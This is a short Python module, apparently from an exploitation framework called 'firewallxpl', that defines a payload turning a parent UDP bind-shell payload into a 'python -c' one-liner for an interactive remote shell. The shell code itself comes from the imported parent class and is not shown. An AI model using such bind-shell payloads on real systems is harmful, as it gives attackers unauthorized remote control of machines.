from firewallxpl.core.exploit import *
from firewallxpl.modules.payloads.python.bind_udp import Payload as PythonBindUDP


class Payload(PythonBindUDP):
    __info__ = {
        "name": "Python Bind UDP One-Liner",
        "description": "Creates interactive udp bind shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # firewallxpl module
        )
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload
